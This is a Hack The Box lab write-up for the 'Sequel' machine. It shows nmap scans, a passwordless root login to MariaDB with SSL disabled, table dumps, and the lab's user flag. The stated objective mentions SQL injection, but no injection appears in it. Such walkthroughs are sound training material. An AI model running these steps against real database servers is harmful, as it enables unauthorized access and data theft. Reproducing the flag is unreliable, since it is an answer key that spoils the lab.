# Sequel Writeup
**[Type: HTB | Lab]**  
**Date:** 2025-08-13  
**Difficulty:** Easy  
**Target IP/URL:** 10.129.191.109  
**Objective:** Learn basics of SQL injection and server-side injection  

---

## 1. Reconnaissance
**Tools & Commands Used:**
- Initial Nmap scan:
  ```bash
  nmap -sV -oN scan.txt -iL ip-address.txt
  ```
- Second Nmap scan with scripts:
  ```bash
  nmap -sC -sV -oN scan.txt -iL ip-address.txt
  ```

**Findings:**
- Port 3306: MariaDB 10.3.27-MariaDB-0+deb10u1 (Debian 10)  
  ![Nmap Scan Result](images/nmap-scan-result.png)

---

## 2. Enumeration
**Tools & Commands Used:**
- Service and version detection:
  ```bash
  nmap -sC -sV -oN scan.txt -iL ip-address.txt
  ```

**Findings:**
- Port 3306 open, running MySQL/MariaDB.  
  ![Nmap Second Scan](images/nmap-second-scan.png)

---

## 3. Exploitation
**Vulnerability Identified:**
- **Name:** Weak Authentication (No CVE)  
- **Why Vulnerable:** MariaDB allows root login without a password when SSL is disabled, indicating misconfiguration.

**Exploit Steps:**
- Attempted MySQL connection:
  ```bash
  mysql -h 10.129.191.109 -u root
  ```
  Output: `ERROR 2026 (HY000): TLS/SSL error: SSL is required, but the server does not support it`
- Connected with SSL disabled:
  ```bash
  mysql --ssl=0 -h 10.129.191.109 -u root
  ```
  Output:
  ```
  Welcome to the MariaDB monitor.  Commands end with ; or \g.
  Your MariaDB connection id is 132
  Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10
  ```
  ![MySQL Connection](images/mysql-connection.png)

---

## 4. Privilege Escalation
**Method:**
- Direct root access via MySQL due to no password requirement.

**Commands & Output:**
- Commands executed:
  ```sql
  SHOW databases;
  USE <database_name>;
  SHOW tables;
  SELECT * FROM <table_name>;
  ```
- Result: Accessed database, listed tables, and retrieved data.  
  ![Show Databases](images/show-databases.png)  
  ![Show Tables](images/show-tables.png)  
  ![Show All Rows](images/show-all-rows.png)

---

## 5. Results
- **User Flag:** `7b4bec00d1a39e3dd4e021ec3d915da8`  
  ![User Flag](images/user-flag.png)

---

## 6. Lessons Learned
**Key Takeaways:**
- MySQL connections may fail without `--ssl=0` due to SSL/TLS mismatches.
- **SSL/TLS**: Encrypts client-server communication to prevent eavesdropping and tampering, using a handshake for authentication and encryption.
- MySQL commands for enumeration:
  - `SHOW databases;`: Lists accessible databases.
  - `USE <database_name>;`: Selects a database.
  - `SHOW tables;`: Lists tables in the current database.
  - `SELECT * FROM <table_name>;`: Retrieves all data from a table.
- Weak authentication (e.g., no password) is a critical misconfiguration.

**Mistakes to Avoid:**
- Not checking for SSL/TLS requirements in MySQL connections.
- Overlooking open ports like 3306 during scanning.

**Tools/Techniques to Remember:**
- Used `mysql` client for database access.
- Nmap with `-sC` for script-based enumeration.

---

## 7. Images
- ![Nmap Scan Result](images/nmap-scan-result.png)
- ![Nmap Second Scan](images/nmap-second-scan.png)
- ![MySQL Connection](images/mysql-connection.png)
- ![Show Databases](images/show-databases.png)
- ![Show Tables](images/show-tables.png)
- ![Show All Rows](images/show-all-rows.png)
- ![User Flag](images/user-flag.png)

---

## 8. References
- [MariaDB Documentation](https://mariadb.com/kb/en/) (MySQL Client)
- [Nmap Documentation](https://nmap.org/book/man.html) (Tool)
- [OWASP Top Ten 2021](https://owasp.org/Top10) (Injection Reference)